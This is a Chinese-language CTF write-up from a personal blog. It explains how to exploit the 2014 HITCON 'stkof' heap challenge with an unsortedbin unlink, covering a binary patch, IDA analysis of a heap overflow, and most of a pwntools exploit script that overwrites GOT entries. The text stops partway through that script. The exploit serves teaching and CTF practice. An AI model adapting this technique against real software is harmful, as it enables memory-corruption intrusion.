<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>PWN入门（3-5-2）- unsortedbin的unlink（例题） | Cyberangel-blog</title><meta name="author" content="Cyberangel"><meta name="copyright" content="Cyberangel"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="referrer" content="no-referrer"><meta name="description" content="以 2014 HITCON stkof 为例进行讲解：https:&#x2F;&#x2F;github.com&#x2F;ctf-wiki&#x2F;ctf-challenges&#x2F;tree&#x2F;master&#x2F;pwn&#x2F;heap&#x2F;unlink&#x2F;2014_hitcon_stkof参考资料：https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_41202237&#x2F;article&#x2F;details&#x2F;108481889 #主要思路https:&#x2F;&#x2F;wzt.ac">
<meta property="og:type" content="article">
<meta property="og:title" content="PWN入门（3-5-2）- unsortedbin的unlink（例题）">
<meta property="og:url" content="https://cyberangel.cn/2020/09/22/PWN%E5%85%A5%E9%97%A8%EF%BC%883-5-2%EF%BC%89-%20unsortedbin%E7%9A%84unlink%EF%BC%88%E4%BE%8B%E9%A2%98%EF%BC%89/index.html">
<meta property="og:site_name" content="Cyberangel-blog">
<meta property="og:description" content="以 2014 HITCON stkof 为例进行讲解：https:&#x2F;&#x2F;github.com&#x2F;ctf-wiki&#x2F;ctf-challenges&#x2F;tree&#x2F;master&#x2F;pwn&#x2F;heap&#x2F;unlink&#x2F;2014_hitcon_stkof参考资料：https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_41202237&#x2F;article&#x2F;details&#x2F;108481889 #主要思路https:&#x2F;&#x2F;wzt.ac">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
<meta property="article:published_time" content="2020-09-22T09:22:06.000Z">
<meta property="article:modified_time" content="2021-07-04T09:57:16.001Z">
<meta property="article:author" content="Cyberangel">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://cyberangel.cn/2020/09/22/PWN%E5%85%A5%E9%97%A8%EF%BC%883-5-2%EF%BC%89-%20unsortedbin%E7%9A%84unlink%EF%BC%88%E4%BE%8B%E9%A2%98%EF%BC%89/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'PWN入门（3-5-2）- unsortedbin的unlink（例题）',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-07-04 17:57:16'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const fontSizeVal = saveToLocal.get('global-font-size')
    if (fontSizeVal !== undefined) {
      document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
    }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Cyberangel-blog" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">317</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Cyberangel-blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">PWN入门（3-5-2）- unsortedbin的unlink（例题）</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-09-22T09:22:06.000Z" title="发表于 2020-09-22 17:22:06">2020-09-22</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-07-04T09:57:16.001Z" title="更新于 2021-07-04 17:57:16">2021-07-04</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">6.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>31分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="PWN入门（3-5-2）- unsortedbin的unlink（例题）"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><span class="disqus-comment-count"><a href="https://cyberangel.cn/2020/09/22/PWN%E5%85%A5%E9%97%A8%EF%BC%883-5-2%EF%BC%89-%20unsortedbin%E7%9A%84unlink%EF%BC%88%E4%BE%8B%E9%A2%98%EF%BC%89/#disqus_thread"></a></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
<p>以 2014 HITCON stkof 为例进行讲解：<br><a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2014_hitcon_stkof">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2014_hitcon_stkof</a><br>参考资料：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41202237/article/details/108481889">https://blog.csdn.net/qq_41202237/article/details/108481889</a> #主要思路<br><a target="_blank" rel="noopener" href="https://wzt.ac.cn/2018/10/16/s-pwn-project-4/">https://wzt.ac.cn/2018/10/16/s-pwn-project-4/</a> #payload 来源<br><strong>感谢@hollk 师傅的文章</strong><br>附件下载：<br>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1tXTaLajFHdKB0Ofxnk8V4Q">https://pan.baidu.com/s/1tXTaLajFHdKB0Ofxnk8V4Q</a><br>提取码：z4p6</p>
</blockquote>
<h1 id="题目说明及检查"><a href="#题目说明及检查" class="headerlink" title="题目说明及检查"></a>题目说明及检查</h1><p>系统说明：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1600856500674-e1570216-d435-4fde-9bc4-e9664061a34e.png#align=left&display=inline&height=105&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200923182124.png&originHeight=105&originWidth=325&size=11795&status=done&style=none&width=325" alt="QQ截图20200923182124.png"><br>libc 版本：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1600856429090-a92748d0-684b-414a-b003-a77cc89638ed.png#align=left&display=inline&height=122&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200923182023.png&originHeight=122&originWidth=677&size=28658&status=done&style=none&width=677" alt="QQ截图20200923182023.png"></p>
<blockquote>
<p>请注意：不要在 libc-2.27 及以上的版本进行 pwn，极有可能无法 getshell</p>
</blockquote>
<p>下载文件，检查一下保护：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1600766634238-2f4a520d-0698-4ffe-88a7-5767e8647803.png#align=left&display=inline&height=141&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200922172346.png&originHeight=141&originWidth=407&size=18708&status=done&style=none&width=407" alt="QQ截图20200922172346.png"><br>ELF-64 位文件，并且开启了 NX 保护和 Canary 保护。</p>
<h1 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h1><h2 id="修改-alarm-函数的参数"><a href="#修改-alarm-函数的参数" class="headerlink" title="修改 alarm 函数的参数"></a>修改 alarm 函数的参数</h2><p>将文件拖入到 IDA 中，直接查看 main 函数的伪代码：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1600766999926-186e9139-23ea-4cdf-b5b5-e843f7fb5510.png#align=left&display=inline&height=679&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200922172951.png&originHeight=679&originWidth=509&size=31630&status=done&style=none&width=509" alt="QQ截图20200922172951.png"><br>main 的开头就是 alarm 函数，拿这个程序来举例，若程序的开启时长超过了 120s 就会自动结束进程，这个对我们 gdb 调试程序很不利。但是我们可以对这个程序进行 patch 从而使程序不会 exit：<br>在 IDA 上方的工具栏中点击：选项-&gt;常规，将操作码字节数修改为 8：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1600768349863-06411e3c-d852-4e02-8c38-38349d2c745c.png#align=left&display=inline&height=459&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200922175223.png&originHeight=459&originWidth=635&size=17994&status=done&style=none&width=635" alt="QQ截图20200922175223.png"><br>查看 alarm 函数的操作码，得到 BF 78<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1600768456350-726e01da-5754-4fd8-bf17-0b44648f1d7c.png#align=left&display=inline&height=350&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200922175408.png&originHeight=350&originWidth=860&size=37403&status=done&style=none&width=860" alt="QQ截图20200922175408.png"><br>使用 16 进制文本编辑器打开程序，就像下面这样：（这里我使用的是 HxD）<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1600768841237-822c1372-7015-4789-9647-de64f90c7832.png#align=left&display=inline&height=699&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200922175707.png&originHeight=699&originWidth=677&size=49146&status=done&style=none&width=677" alt="QQ截图20200922175707.png"><br>搜索“BF 78”：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1600769087428-829b2ed1-1506-49a1-9c9b-d2ce26b79b56.png#align=left&display=inline&height=209&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200922175750.png&originHeight=209&originWidth=382&size=20215&status=done&style=none&width=382" alt="QQ截图20200922175750.png"><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1600769088411-304ca058-8bfe-439d-85f4-d2ca23fa88c7.png#align=left&display=inline&height=251&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200922175833.png&originHeight=251&originWidth=341&size=10812&status=done&style=none&width=341" alt="QQ截图20200922175833.png"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1600769168110-e8ba1236-c335-4132-9876-a2a91baf81f2.png#align=left&display=inline&height=97&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200922180558.png&originHeight=97&originWidth=608&size=17441&status=done&style=none&width=608" alt="QQ截图20200922180558.png"><br>修改为：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1600769305895-d784dc9e-45b8-42ba-9d37-6cf750662eed.png#align=left&display=inline&height=79&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200922180805.png&originHeight=79&originWidth=612&size=14941&status=done&style=none&width=612" alt="QQ截图20200922180805.png"><br>然后将文件保存为：stkof_patch，最后再使用 IDA 打开修改之后的文件，查看以下是否修改成功<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1600769857690-0d609922-d2c6-47b8-b12e-e2d1fdbca02c.png#align=left&display=inline&height=49&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200922181721.png&originHeight=49&originWidth=243&size=3553&status=done&style=none&width=243" alt="QQ截图20200922181721.png"><br>修改成功，之后我们 gdb 调试的时候使用这个修改过后的文件而不是原来的。</p>
<h2 id="IDA-静态分析"><a href="#IDA-静态分析" class="headerlink" title="IDA 静态分析"></a>IDA 静态分析</h2><h3 id="对-main-函数进行分析"><a href="#对-main-函数进行分析" class="headerlink" title="对 main 函数进行分析"></a>对 main 函数进行分析</h3><p>main 函数实际上就是对程序功能的选择，具体的注释如下：<br><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1600770974602-3d4e4799-4240-486f-8b87-652a9e46f31c.png#align=left&display=inline&height=681&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200922183607.png&originHeight=681&originWidth=899&size=43562&status=done&style=none&width=899" alt="QQ截图20200922183607.png"></p>
<h3 id="1、对-create-a-heap-函数进行分析"><a href="#1、对-create-a-heap-函数进行分析" class="headerlink" title="1、对 create_a_heap 函数进行分析"></a>1、对 create_a_heap 函数进行分析</h3><p><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1600775272583-6bd66ea4-2d2e-4ed2-8d02-aa1c78aeaa78.png#align=left&display=inline&height=262&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200922194745.png&originHeight=262&originWidth=617&size=23541&status=done&style=none&width=617" alt="QQ截图20200922194745.png"></p>
<blockquote>
<p>请注意：堆的序列是从 1 开始的</p>
</blockquote>
<h3 id="2、对-edit-a-heap-函数进行分析"><a href="#2、对-edit-a-heap-函数进行分析" class="headerlink" title="2、对 edit_a_heap 函数进行分析"></a>2、对 edit_a_heap 函数进行分析</h3><p><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1600775318672-41a9b134-5926-4af2-bc1f-7d4688cf7726.png#align=left&display=inline&height=476&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200922194827.png&originHeight=476&originWidth=794&size=35227&status=done&style=none&width=794" alt="QQ截图20200922194827.png"></p>
<blockquote>
<p><strong>堆溢出警告！！！</strong></p>
</blockquote>
<h3 id="3、对-delete-a-heap-函数进行分析"><a href="#3、对-delete-a-heap-函数进行分析" class="headerlink" title="3、对 delete_a_heap 函数进行分析"></a>3、对 delete_a_heap 函数进行分析</h3><p><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1600775350756-54db5592-8e4c-419e-9cff-f20018493710.png#align=left&display=inline&height=256&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200922194903.png&originHeight=256&originWidth=566&size=19510&status=done&style=none&width=566" alt="QQ截图20200922194903.png"></p>
<h3 id="4、对-Check-the-usage-of-the-heap-函数继续分析"><a href="#4、对-Check-the-usage-of-the-heap-函数继续分析" class="headerlink" title="4、对 Check_the_usage_of_the_heap 函数继续分析"></a>4、对 Check_the_usage_of_the_heap 函数继续分析</h3><p><img src="https://cdn.nlark.com/yuque/0/2020/png/574026/1600775443953-f8d2e501-721a-4b5c-a2a2-1b44009ed917.png#align=left&display=inline&height=289&margin=%5Bobject%20Object%5D&name=QQ%E6%88%AA%E5%9B%BE20200922195037.png&originHeight=289&originWidth=431&size=17455&status=done&style=none&width=431" alt="QQ截图20200922195037.png"><br>上面的代码有注释，这里不过多的细说了，主要是注意一下 edit_a_heap 函数中有个堆溢出漏洞就可以了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = fread(ptr, <span class="number">1uLL</span>, n, <span class="built_in">stdin</span>); i &gt; <span class="number">0</span>; i = fread(ptr, <span class="number">1uLL</span>, n, <span class="built_in">stdin</span>) )</span><br><span class="line"> &#123; <span class="comment">// 申请的堆空间是有长度限制的，但是修改时对输入没有限制，可造成堆溢出</span></span><br><span class="line">   ptr += i;</span><br><span class="line">   n -= i;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>fread 函数原型如下：size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream)<br>参数：</p>
<ul>
<li>ptr – 这是指向带有最小尺寸 size*nmemb 字节的内存块的指针</li>
<li>size – 这是要读取的每个元素的大小，以字节为单位</li>
<li>nmemb – 这是元素的个数，每个元素的大小为 size 字节</li>
<li>stream – 这是指向 FILE 对象的指针，该 FILE 对象指定了一个输入流</li>
</ul>
<p>返回值：<br>成功读取的元素总数会以 size_t 对象返回，size_t 对象是一个整型数据类型。如果总数与 nmemb 参数不同，则可能发生了一个错误或者到达了文件末尾</p>
</blockquote>
<blockquote>
<p><strong>简单的说，fread 函数可以对堆中的数据进行录入修改。</strong> &gt; <strong>还有一点要说的是 malloc 返回的指针是指向 chunk_data 的，而不是 prev_size</strong></p>
</blockquote>
<p>IDA 的静态分析到此结束。</p>
<h1 id="思路分析及动态调试"><a href="#思路分析及动态调试" class="headerlink" title="思路分析及动态调试"></a>思路分析及动态调试</h1><p>为了讲解方便，因此我们先将 exp 贴到文章中，请先阅读以留个印象。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context(log_level=<span class="string">&quot;DEBUG&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index, length, content</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./stkof_patch&quot;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./stkof_patch&quot;</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;Creating chunk1, avoid stdout&#x27;s buffer.&quot;</span>)</span><br><span class="line">create(<span class="number">0x100</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;Creating chunk2...&quot;</span>)</span><br><span class="line">create(<span class="number">0x30</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;Creating chunk3...&quot;</span>)</span><br><span class="line">create(<span class="number">0x80</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;Creating fake chunk...&quot;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x30</span>) + p64(<span class="number">0x602140</span> + <span class="number">16</span> - <span class="number">0x18</span>) + p64(<span class="number">0x602140</span> + <span class="number">16</span> - <span class="number">0x10</span>) + <span class="string">&#x27;a&#x27;</span> * <span class="number">0x10</span> + p64(<span class="number">0x30</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">2</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;Now we have fake chunks, just free chunk3 to change global pointer...&quot;</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">log.success(<span class="string">&quot;Global pointer has been changed!&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;Finding address in program...&quot;</span>)</span><br><span class="line">free_got = elf.got[<span class="string">&quot;free&quot;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">&quot;atoi&quot;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">log.success(<span class="string">&quot;free@got : 0x%x&quot;</span> % free_got)</span><br><span class="line">log.success(<span class="string">&quot;puts@got : 0x%x&quot;</span> % puts_got)</span><br><span class="line">log.success(<span class="string">&quot;atoi@got : 0x%x&quot;</span> % atoi_got)</span><br><span class="line">log.success(<span class="string">&quot;puts@plt : 0x%x&quot;</span> % puts_plt)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;Overwriting global pointers...&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">8</span> + p64(free_got) + p64(puts_got) + p64(atoi_got)</span><br><span class="line">edit(<span class="number">2</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">log.success(<span class="string">&quot;Complete!&quot;</span>)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;Changing free@got --&gt; puts@plt...&quot;</span>)</span><br><span class="line">payload2 